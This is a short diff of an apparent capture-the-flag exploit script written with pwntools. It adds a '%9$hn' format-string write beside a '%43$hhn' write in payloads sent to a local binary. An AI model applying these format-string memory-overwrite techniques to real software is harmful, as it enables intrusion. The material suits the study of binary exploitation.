@@ -6,7 +6,6 @@ context.os = "linux"
 #context.log_level='debug'
 
 io = process('./pwn')
-elf = ELF("./pwn")
 libc = ELF('./libc.so.6')
 
 ### leak
@@ -26,7 +25,7 @@ empty_stack = somestack - 0x28
 ### payload 1
 
 io.send(
-    (f"%{empty_stack & 0xffff}c".encode()).ljust(0x1000, b'\x00')
+    (f"%{empty_stack & 0xffff}c".encode() + b"%9$hn").ljust(0x1000, b'\x00')
 )
 io.send(
     (b"%43$hhn").ljust(0x1000, b'\x00')
